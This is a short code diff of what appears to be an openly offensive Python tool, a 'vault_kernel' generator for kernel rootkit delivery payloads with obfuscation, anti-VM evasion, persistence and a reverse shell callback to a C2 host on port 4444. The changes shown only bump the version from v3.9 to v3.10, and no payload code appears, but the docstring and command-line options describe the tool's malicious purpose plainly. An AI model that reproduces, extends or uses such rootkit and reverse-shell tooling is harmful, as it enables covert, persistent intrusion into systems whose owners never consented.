@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-vault_kernel Payload Generator v3.9
+vault_kernel Payload Generator v3.10
 Interactive builder for kernel rootkit delivery payloads.
 Auto-detects local IP, generates obfuscated multi-format payloads
 with anti-VM evasion and persistence.
@@ -416,7 +416,7 @@ int main(int argc, char **argv) {{
 # ================================================================
 def cli():
     import argparse
-    p = argparse.ArgumentParser(description="vault_kernel v3.9 Payload Generator")
+    p = argparse.ArgumentParser(description="vault_kernel v3.10 Payload Generator")
     p.add_argument("--host", help="C2 IP for reverse shell callback")
     p.add_argument("--port", default="4444", help="C2 port")
     p.add_argument("--format", choices=["bash","python","c","all"], default="bash")
@@ -461,7 +461,7 @@ def cli():
 # ================================================================
 def interactive():
     print("""
-  vault_kernel — Payload Generator v3.9
+  vault_kernel — Payload Generator v3.10
   ruby570bocadito (c) 2026
 """)
     local_ip = get_local_ip()
